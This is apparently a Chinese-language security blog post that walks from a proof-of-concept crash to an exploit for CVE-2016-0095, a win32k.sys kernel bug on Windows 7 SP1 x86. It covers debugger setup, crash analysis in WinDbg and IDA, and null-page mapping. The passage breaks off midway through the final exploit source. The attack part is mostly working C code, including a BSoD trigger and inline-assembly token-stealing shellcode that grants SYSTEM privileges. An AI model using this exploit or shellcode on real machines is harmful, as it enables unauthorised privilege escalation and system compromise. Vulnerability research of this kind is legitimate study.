<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Vulnerability|Security|Binary"><title>CVE-2016-0095从PoC到Exploit | WeaponX's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">CVE-2016-0095从PoC到Exploit</h1><a id="logo" href="/.">WeaponX's Blog</a><p class="description">Binary</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">CVE-2016-0095从PoC到Exploit</h1><div class="post-meta">Aug 11, 2017<span> | </span><span class="category"><a href="/categories/tech/">技术</a></span></div><div class="post-content"><h2 id="利用Vmware进行双机调试"><a href="#利用Vmware进行双机调试" class="headerlink" title="利用Vmware进行双机调试"></a>利用Vmware进行双机调试</h2><ol>
<li>使用管理员模式运行cmd</li>
<li>bcdedit /copy {current} /d “Windwos7[DEBUG]”</li>
<li>开启调试<code>bcdedit /debug ON</code>和<code>bcdedit /bootdebug ON</code></li>
<li>在Vmware的设备管理添加一个串口<code>\\.\pipe\com_1</code></li>
<li>执行<code>Windbg.exe -b -k com:port=\\.\pipe\com_1,baud=115200,pipe</code></li>
</ol>
<p>注意 vmware 有个坑，默认添加打印机占用串口com1口，所以我们开启内核调试的串口就变成了com2，不过只要删除了com1即可。</p>
<h2 id="利用VirtualKD和Vmware双机调试"><a href="#利用VirtualKD和Vmware双机调试" class="headerlink" title="利用VirtualKD和Vmware双机调试"></a>利用VirtualKD和Vmware双机调试</h2><p>Vmware利用串口进行双机调试就一个感受，慢。串口波特率115200也就是传输速度在14KB/s左右。</p>
<p>VirtualKD下载地址: <a href="http://virtualkd.sysprogs.org/download/" target="_blank" rel="external">http://virtualkd.sysprogs.org/download/</a></p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>造成BSoD的代码拿来直接编译不了，稍微修改了一下:</p>
<ul>
<li>加入了<code>#include &lt;tchar.h&gt;</code></li>
<li>声明<code>WIN32KAPI</code>：<code>#define W32KAPI  DECLSPEC_ADDRSAFE</code></li>
<li>获取<code>KiFastSystemCall</code>的地址:<code>PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(&quot;ntdll.dll&quot;), &quot;KiFastSystemCall&quot;);</code></li>
</ul>
<p>修改后的源代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* Author: bee13oy of CloverSec Labs</div><div class="line">* BSoD on Windows 7 SP1 x86 / Windows 10 x86</div><div class="line">* EoP to SYSTEM on Windows 7 SP1 x86</div><div class="line">**/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"gdi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"user32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> W32KAPI  DECLSPEC_ADDRSAFE</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">demo_CreateBitmapIndirect</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> BITMAP bitmap = &#123; <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</div><div class="line">    <span class="keyword">static</span> BYTE bits[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>,</div><div class="line">        <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">    bitmap.bmBits = bits;</div><div class="line"></div><div class="line">    SetLastError(NO_ERROR);</div><div class="line"></div><div class="line">    HBITMAP hBitmap = CreateBitmapIndirect(&amp;bitmap);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hBitmap;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> eSyscall_NtGdiSetBitmapAttributes 0x1110</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function">W32KAPI HBITMAP NTAPI <span class="title">NtGdiSetBitmapAttributes</span><span class="params">(</span></span></div><div class="line">    HBITMAP argv0,</div><div class="line">    DWORD argv1</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">    PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(<span class="string">"ntdll.dll"</span>), <span class="string">"KiFastSystemCall"</span>);</div><div class="line"></div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        push argv1;</div><div class="line">        push argv0;</div><div class="line">        push <span class="number">0x00</span>;</div><div class="line">        mov eax, eSyscall_NtGdiSetBitmapAttributes;</div><div class="line">        mov edx, addr_kifastsystemcall;</div><div class="line">        call edx;</div><div class="line">        add esp, <span class="number">0x0c</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Trigger_BSoDPoc</span><span class="params">()</span> </span>&#123;</div><div class="line">    HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();</div><div class="line">    HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)<span class="number">0x8f9</span>);</div><div class="line"></div><div class="line">    RECT rect = &#123; <span class="number">0</span> &#125;;</div><div class="line">    rect.left = <span class="number">0x368c</span>;</div><div class="line">    rect.top = <span class="number">0x400000</span>;</div><div class="line">    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);</div><div class="line"></div><div class="line">    HDC hdc = (HDC)CreateCompatibleDC((HDC)<span class="number">0x0</span>);</div><div class="line">    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);</div><div class="line"></div><div class="line">    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)<span class="number">0x00edfc13</span>);</div><div class="line"></div><div class="line">    FillRgn((HDC)hdc, (HRGN)hRgn, (HBRUSH)hBrush);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</div><div class="line">&#123;</div><div class="line">    Trigger_BSoDPoc();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用vs2015编译，放到虚拟机运行不了，提示缺少<code>VSRUNTIME140.dll</code>，此时装一个vc++ 2015的运行环境即可。运行后直接蓝屏重启。</p>
<p>这个PoC对应的是一个内核漏洞，所以需要使用虚拟机进行双机调试。</p>
<p>然后执行程序，Windbg捕获到异常：</p>
<figure class="highlight erlang-repl"><table><tr><td class="code"><pre><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!bGetRealizedBrush+<span class="number">0</span>x38:</div><div class="line"><span class="number">93</span>d50560 f6402401        test    byte ptr [eax+<span class="number">24</span>h],<span class="number">1</span></div></pre></td></tr></table></figure>
<p>发现程序在此崩溃，首先看调用栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; kb</div><div class="line">ChildEBP RetAddr  Args to Child              </div><div class="line">951909a0 832b34af 00000000 00000000 832ad5a0 win32k!bGetRealizedBrush+0x38</div><div class="line">951909b8 83329b5e 95190af8 00000001 95190a7c win32k!pvGetEngRbrush+0x1f</div><div class="line">95190a1c 833ab6e8 fe5f9018 00000000 00000000 win32k!EngBitBlt+0x337</div><div class="line">95190a54 833abb9d fe5f9018 95190a7c 95190af8 win32k!EngPaint+0x51</div><div class="line">95190c20 83e8d1ea 00000000 ffbff968 141006fe win32k!NtGdiFillRgn+0x339</div><div class="line">95190c20 77c670b4 00000000 ffbff968 141006fe nt!KiFastCallEntry+0x12a</div><div class="line">0028fe38 7662066b 7662064f 5f010631 1f040708 ntdll!KiFastSystemCallRet</div><div class="line">0028fe3c 7662064f 5f010631 1f040708 141006fe gdi32!NtGdiFillRgn+0xc</div><div class="line">0028fe5c 003310de 5f010631 1f040708 141006fe gdi32!FillRgn+0xb2</div><div class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</div><div class="line">0028fee4 766b3c45 7ffde000 0028ff30 77c837f5 0x3310de</div><div class="line">0028fef0 77c837f5 7ffde000 77e6f957 00000000 kernel32!BaseThreadInitThunk+0xe</div><div class="line">0028ff30 77c837c8 0033133a 7ffde000 00000000 ntdll!__RtlUserThreadStart+0x70</div><div class="line">0028ff48 00000000 0033133a 7ffde000 00000000 ntdll!_RtlUserThreadStart+0x1b</div></pre></td></tr></table></figure>
<p>随后，使用ln看一下，</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><div class="line">kd&gt; ln</div><div class="line">(<span class="number">93</span>d<span class="number">50528</span>)   win<span class="number">32</span>k<span class="title">!bGetRealizedBrush</span>+<span class="number">0x38</span>   |  (<span class="number">93</span>d<span class="number">50</span><span class="keyword">c</span><span class="number">9</span><span class="keyword">c</span>)   win<span class="number">32</span>k<span class="title">!xxxEnableWindow</span></div></pre></td></tr></table></figure>
<p>崩溃发生在win32k.sys中的<code>bGetRealizedBrush</code>函数。此时eax为0，<code>eax+24h = 0x00000024</code>，内存不可读取，造成BSoD。</p>
<p>然后使用ida载入<code>win32k.sys</code>，看<code>bGetRealizedBrush</code>函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF84053C                 xor     eax, eax</div><div class="line">.text:BF84053E                 jmp     loc_BF840C92</div><div class="line">.text:BF840543 ; ---------------------------------------------------------------------------</div><div class="line">.text:BF840543</div><div class="line">.text:BF840543 loc_BF840543:                           ; CODE XREF: bGetRealizedBrush(BRUSH *,EBRUSHOBJ *,int (*)(_BRUSHOBJ *,_SURFOBJ *,_SURFOBJ *,_SURFOBJ *,_XLATEOBJ *,ulong))+12j</div><div class="line">.text:BF840543                 push    ebx</div><div class="line">.text:BF840544                 mov     ebx, [ebp+arg_4]</div><div class="line">.text:BF840547                 push    esi</div><div class="line">.text:BF840548                 xor     esi, esi</div><div class="line">.text:BF84054A                 mov     [ebp+var_24], eax</div><div class="line">.text:BF84054D                 mov     eax, [ebx+34h]</div><div class="line">.text:BF840550                 mov     [ebp+arg_0], esi</div><div class="line">.text:BF840553                 mov     [ebp+P], esi</div><div class="line">.text:BF840556                 mov     [ebp+var_28], 0</div><div class="line">.text:BF84055A                 mov     eax, [eax+1Ch]</div><div class="line">.text:BF84055D                 mov     [ebp+arg_4], eax</div><div class="line">.text:BF840560                 test    byte ptr [eax+24h], 1; =&gt; Creash here!!!</div></pre></td></tr></table></figure>
<p>可以看到，eax是从ebx+34h获取的。ebx则是第二个参数。</p>
<p><img src="1.png" alt=""></p>
<p>取到的eax为<code>fe5f9008</code>，</p>
<p><img src="2.png" alt=""></p>
<p><code>eax+1ch</code>为0，现在需要知道+1ch是什么东西。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">***</span></div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Your debugger is not using the correct symbols                 **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    In order for this command to work properly, your symbol path   **</span>*</div><div class="line"><span class="strong">***    must point to .pdb files that have full type information.      **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Certain .pdb files (such as the public OS symbols) do not      **</span>*</div><div class="line"><span class="strong">***    contain the required information.  Contact the group that      **</span>*</div><div class="line"><span class="strong">***    provided you with these symbols if you need this command to    **</span>*</div><div class="line"><span class="strong">***    work.                                                          **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">***    Type referenced: _EBRUSHOBJ                                    **</span>*</div><div class="line"><span class="strong">***                                                                   **</span>*</div><div class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="emphasis">***</span></div><div class="line">Symbol _EBRUSHOBJ not found.</div></pre></td></tr></table></figure>
<p>回溯到<code>win32k!NtGdiFillRgn</code>当程序准备调用<code>win32k!EngPaint</code>时候：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd esp</div><div class="line">9760ba5c  fe5fadb8 9760ba7c 9760baf8 fd795d60</div><div class="line">9760ba6c  00000d0d 050106dd 0026fd34 93a6b864</div><div class="line">9760ba7c  000038bc 00000000 00000000 00000008</div><div class="line">9760ba8c  00000008 00000001 86a5e458 00000004</div><div class="line">9760ba9c  9760bb04 83e51904 86a5e660 9760bae4</div><div class="line">9760baac  fe9ff008 00000002 881a34c8 88543030</div><div class="line">9760babc  ffffffff 00000000 00000000 00c1309c</div><div class="line">9760bacc  00000000 83e7d7ad 0000008d 6aab658b</div></pre></td></tr></table></figure>
<p>函数的声明如下：</p>
<p><code>int __stdcall EngPaint(struct _SURFOBJ *a1, int a2, struct _BRUSHOBJ *a3, struct _POINTL *a4, unsigned int a5)</code></p>
<p>可以得到<code>fe5fadb8=&gt;_SURFOBJ;9760baf8=&gt;_BRUSHOBJ</code></p>
<p>然后在<code>win32k!bGetRealizedBrush</code>下断点，断下来后看参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd esp</div><div class="line">9760b9a4  939734af fd7eb188 9760baf8 9396d5a0</div><div class="line">9760b9b4  9760baf8 9760ba1c 939e9b5e 9760baf8</div><div class="line">9760b9c4  00000001 9760ba7c fe5fadb8 00000000</div><div class="line">9760b9d4  00000000 00000000 00000000 00000000</div><div class="line">9760b9e4  00000023 00000023 00000000 fe5fada8</div><div class="line">9760b9f4  939e9827 fe5fada8 ffffffff 00000030</div><div class="line">9760ba04  00000001 9760ba7c fe5fadb8 00000000</div><div class="line">9760ba14  00000000 00000000 9760ba54 93a6b6e8</div></pre></td></tr></table></figure>
<p>发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">kd&gt; dd 9760baf8</div><div class="line">9760baf8  ffffffff 00000000 00000000 00edfc13</div><div class="line">9760bb08  00edfc13 00000000 00000006 00000004</div><div class="line">9760bb18  00000000 00ffffff fd7957c4 00000000</div><div class="line">9760bb28  00000000 fe5fada8 ffbff968 ffbffe68</div><div class="line">9760bb38  ffbbd540 00000006 fd7eb188 00000014</div><div class="line">9760bb48  000000aa 00000001 83f71f01 83eba892</div><div class="line">9760bb58  9760bb78 9760bbac 00000000 00000000</div><div class="line">9760bb68  9760bc10 9760bbac 00000000 00000000</div></pre></td></tr></table></figure>
<p>9760baf8+34h的值为<code>fe5fada8</code>，这个值恰好为<code>fe5fadb8+10h</code>，所以<code>fe5fada8+1ch = fe5fadb8+10h+ch</code></p>
<p>打开brush.h看到_SURFOBJ结构体定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> _SURFOBJ</div><div class="line">&#123;</div><div class="line">    PVOID  dhsurf;</div><div class="line">    PVOID   hsurf;</div><div class="line">    PVOID  dhpdev;</div><div class="line">    PVOID    hdev;</div><div class="line">    LARGE_INTEGER   sizlBitmap;</div><div class="line">    ULONG   cjBits;</div><div class="line">    PVOID   pvBits;</div><div class="line">    PVOID   pvScan0;</div><div class="line">    LONG    lDelta;</div><div class="line">    ULONG   iUniq;</div><div class="line">    ULONG   iBitmapFormat;</div><div class="line">    USHORT  iType;</div><div class="line">    USHORT  fjBitmap;</div><div class="line">&#125; SURFOBJ;</div></pre></td></tr></table></figure>
<p>所以，漏洞的本质是<code>_SURFOBJ-&gt;hdev</code>没有定义导致引用不可读内存，造成访问违例触发BSoD。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>x86的win 7 不存在 零页内存分配保护和SMEP。</p>
<p>所谓SMEP是一种安全措施，就是不能在内核态执行用户态的代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">typedef</span> NTSTATUS <span class="title">NtAllocateVirtualMemory</span><span class="params">(</span></span></div><div class="line">    IN HANDLE     ProcessHandle,</div><div class="line">    IN OUT PVOID  *BaseAddress,</div><div class="line">    IN ULONG      ZeroBits,</div><div class="line">    IN OUT PULONG AllocationSize,</div><div class="line">    IN ULONG      AllocationType,</div><div class="line">    IN ULONG Protect</div><div class="line">    )</div></pre></td></tr></table></figure>
<p>利用BaseAddress参数在零页内存中分配空间，但是当BaseAddress指定为0时，系统会寻找第一个未使用的内存块来分配，而不是在零页内存中分配。所以指定BaseAddress为1即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840544                 mov     ebx, [ebp+arg_4]</div><div class="line">.text:BF840547                 push    esi</div><div class="line">.text:BF840548                 xor     esi, esi</div><div class="line">.text:BF84054A                 mov     [ebp+var_24], eax</div><div class="line">.text:BF84054D                 mov     eax, [ebx+34h]</div><div class="line">.text:BF840550                 mov     [ebp+arg_0], esi</div><div class="line">.text:BF840553                 mov     [ebp+P], esi</div><div class="line">.text:BF840556                 mov     [ebp+var_28], 0</div><div class="line">.text:BF84055A                 mov     eax, [eax+1Ch]</div><div class="line">.text:BF84055D                 mov     [ebp+arg_4], eax ;注意，此时[ebp+arg_4]就是0了</div><div class="line">.text:BF840560                 test    byte ptr [eax+24h], 1</div><div class="line">.text:BF840564                 mov     [ebp+var_1C], esi</div><div class="line">.text:BF840567                 mov     [ebp+var_10], esi</div></pre></td></tr></table></figure>
<p>之后我们只需要找能控制程序指令流程的点，也就是<code>call</code>或者<code>jmp</code>一个我们可以改变的值上。因此我们找到了如下可能可以利用的点。</p>
<p>第一点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF84076B                 push    esi</div><div class="line">.text:BF84076C                 push    ecx</div><div class="line">.text:BF84076D                 push    ebx</div><div class="line">.text:BF84076E                 call    [ebp+arg_8]</div><div class="line">.text:BF840771                 test    eax, eax</div></pre></td></tr></table></figure>
<p>第二点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840816                 mov     edx, [ebx+0Ch]</div><div class="line">.text:BF840819                 push    ecx</div><div class="line">.text:BF84081A                 push    edx</div><div class="line">.text:BF84081B                 push    [ebp+var_14]</div><div class="line">.text:BF84081E                 push    eax</div><div class="line">.text:BF84081F                 call    edi</div></pre></td></tr></table></figure>
<p>第三点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">.text:BF840C27                 push    [ebp+var_24]</div><div class="line">.text:BF840C2A                 push    esi</div><div class="line">.text:BF840C2B                 push    [ebp+var_1C]</div><div class="line">.text:BF840C2E                 push    ecx</div><div class="line">.text:BF840C2F                 push    eax</div><div class="line">.text:BF840C30                 push    ebx</div><div class="line">.text:BF840C31                 call    [ebp+arg_8]</div></pre></td></tr></table></figure>
<p>回溯了整个函数发现<code>eb[+arg_8]</code>也就是这个函数的第三个参数其实我们是无法控制的。再会看第二点，寻找<code>edi</code>的来源，发现其实<code>edi</code>是可控。</p>
<p><img src="5.png" alt=""></p>
<p>可以发现<code>edi</code>来源与<code>[[ebp+arg_4]+748h]</code>不过此时<code>[ebp+arg_4]</code>是0，所以我们可以分配零页内存控制748h的数据。控制了<code>edi</code>就可以控制程序指令流程执行我们的<code>token-steal shellcode</code>来完成token的替换。</p>
<p>接下来需要控制程序执行到这里，继续回溯。</p>
<p><img src="6.png" alt=""></p>
<p>程序要走到我们能控制的地方需要图中红框的条件成立，经调试<code>si=1</code>。看到eax其实是0，所以需要控制590h和592h的值均为1。</p>
<p>最终我们的exploit如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line">* Author: bee13oy of CloverSec Labs</div><div class="line">* BSoD on Windows 7 SP1 x86 / Windows 10 x86</div><div class="line">* EoP to SYSTEM on Windows 7 SP1 x86</div><div class="line">**/</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"gdi32.lib"</span>)</span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"user32.lib"</span>)</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> W32KAPI  DECLSPEC_ADDRSAFE</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *pNtAllocateVirtualMemory)</span><span class="params">(</span></span></div><div class="line">    IN HANDLE     ProcessHandle,</div><div class="line">    IN OUT PVOID  *BaseAddress,</div><div class="line">    IN ULONG      ZeroBits,</div><div class="line">    IN OUT PULONG AllocationSize,</div><div class="line">    IN ULONG      AllocationType,</div><div class="line">    IN ULONG Protect</div><div class="line">    );</div><div class="line"></div><div class="line"><span class="comment">// Windows 7 SP1 x86 Offsets</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> KTHREAD_OFFSET    0x124    <span class="comment">// nt!_KPCR.PcrbData.CurrentThread</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> EPROCESS_OFFSET   0x050    <span class="comment">// nt!_KTHREAD.ApcState.Process</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PID_OFFSET        0x0B4    <span class="comment">// nt!_EPROCESS.UniqueProcessId</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> FLINK_OFFSET      0x0B8    <span class="comment">// nt!_EPROCESS.ActiveProcessLinks.Flink</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> TOKEN_OFFSET      0x0F8    <span class="comment">// nt!_EPROCESS.Token</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSTEM_PID        0x004    <span class="comment">// SYSTEM Process PID</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// 4 params</span></div><div class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">TokenStealingShellcodeWin7</span><span class="params">(<span class="keyword">int</span> a1,<span class="keyword">int</span> a2,<span class="keyword">int</span> a3,<span class="keyword">int</span> a4)</span> </span>&#123;</div><div class="line">    <span class="comment">// Importance of Kernel Recovery</span></div><div class="line">    __asm &#123;</div><div class="line">        ; initialize</div><div class="line">            pushad; save registers state</div><div class="line"></div><div class="line">            xor eax, eax;</div><div class="line"></div><div class="line">            mov eax, fs:[KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread</div><div class="line">            mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process</div><div class="line"></div><div class="line">            mov ecx, eax; Copy current _EPROCESS structure</div><div class="line"></div><div class="line">            mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token</div><div class="line">            mov edx, SYSTEM_PID; WIN <span class="number">7</span> SP1 SYSTEM Process PID = <span class="number">0x4</span></div><div class="line"></div><div class="line">            SearchSystemPID:</div><div class="line">            mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink</div><div class="line">            sub eax, FLINK_OFFSET</div><div class="line">            cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId</div><div class="line">            jne SearchSystemPID</div><div class="line"></div><div class="line">            mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token</div><div class="line">            mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process</div><div class="line">            popad; restore registers state</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">demo_CreateBitmapIndirect</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</div><div class="line">    <span class="keyword">static</span> BITMAP bitmap = &#123; <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span> &#125;;</div><div class="line">    <span class="keyword">static</span> BYTE bits[<span class="number">8</span>][<span class="number">2</span>] = &#123; <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>, <span class="number">0x0C</span>, <span class="number">0</span>,</div><div class="line">        <span class="number">0xFF</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span>, <span class="number">0xC0</span>, <span class="number">0</span> &#125;;</div><div class="line"></div><div class="line">    bitmap.bmBits = bits;</div><div class="line"></div><div class="line">    SetLastError(NO_ERROR);</div><div class="line"></div><div class="line">    HBITMAP hBitmap = CreateBitmapIndirect(&amp;bitmap);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)hBitmap;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> eSyscall_NtGdiSetBitmapAttributes 0x1110</span></div><div class="line"></div><div class="line"><span class="function">W32KAPI HBITMAP NTAPI <span class="title">NtGdiSetBitmapAttributes</span><span class="params">(</span></span></div><div class="line">    HBITMAP argv0,</div><div class="line">    DWORD argv1</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">    PVOID addr_kifastsystemcall = (PVOID)GetProcAddress(LoadLibrary(<span class="string">"ntdll.dll"</span>), <span class="string">"KiFastSystemCall"</span>);</div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        push argv1;</div><div class="line">        push argv0;</div><div class="line">        push <span class="number">0x00</span>;</div><div class="line">        mov eax, eSyscall_NtGdiSetBitmapAttributes;</div><div class="line">        mov edx, addr_kifastsystemcall;</div><div class="line">        call edx;</div><div class="line">        add esp, <span class="number">0x0c</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">Trigger_BSoDPoc</span><span class="params">()</span> </span>&#123;</div><div class="line">    HBITMAP hBitmap1 = (HBITMAP)demo_CreateBitmapIndirect();</div><div class="line">    HBITMAP hBitmap2 = (HBITMAP)NtGdiSetBitmapAttributes((HBITMAP)hBitmap1, (DWORD)<span class="number">0x8f9</span>);</div><div class="line"></div><div class="line">    RECT rect = &#123; <span class="number">0</span> &#125;;</div><div class="line">    rect.left = <span class="number">0x368c</span>;</div><div class="line">    rect.top = <span class="number">0x400000</span>;</div><div class="line">    HRGN hRgn = (HRGN)CreateRectRgnIndirect(&amp;rect);</div><div class="line"></div><div class="line">    HDC hdc = (HDC)CreateCompatibleDC((HDC)<span class="number">0x0</span>);</div><div class="line">    SelectObject((HDC)hdc, (HGDIOBJ)hBitmap2);</div><div class="line"></div><div class="line">    HBRUSH hBrush = (HBRUSH)CreateSolidBrush((COLORREF)<span class="number">0x00edfc13</span>);</div><div 